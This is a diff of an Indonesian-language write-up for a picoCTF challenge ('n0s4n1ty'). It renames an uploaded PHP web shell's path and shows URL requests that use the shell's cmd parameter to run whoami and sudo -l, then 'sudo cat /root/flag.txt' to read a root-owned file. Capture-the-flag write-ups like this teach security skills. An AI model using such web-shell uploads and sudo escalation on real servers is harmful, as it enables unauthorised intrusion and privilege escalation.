@@ -32,25 +32,23 @@ if(isset($_GET['cmd'])){
 
 File utama dapat diakses [disini](/NOSANITY/n0s4n1ty-1.php).
 
-![App Screenshot](/images/6.png)
-
 3. Maka perintah apa pun dapat dieksekusi dengan memicu jalur:
    Endpoint: uploads/shell.php?cmd=
 
 ```bash
-http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=
+http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=
 ```
 
 - Mari kita periksa pengguna saat ini:
 
 ```bash
-http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=whoami
+http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=whoami
 ```
 
 - Sekarang mari kita lihat hak istimewa untuk pengguna saat ini:
 
 ```bash
-http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo -l
+http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=sudo -l
 ```
 
 - Setelah mengeksekusi peerintah diatas, maka akan muncul seperti ini
@@ -72,7 +70,7 @@ User www-data may run the following commands on challenge:
 - Sekarang mari kita dapatkan flag sebagai pengguna root:
 
 ```bash
-http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/flag.txt
+http://standard-pizzas.picoctf.net:63914/uploads/n0s4n1ty-1.php?cmd=sudo cat /root/flag.txt
 ```
 
 - Setelah perintah diatas dijalankan maka kita akan dapat menemukan flag-nya.
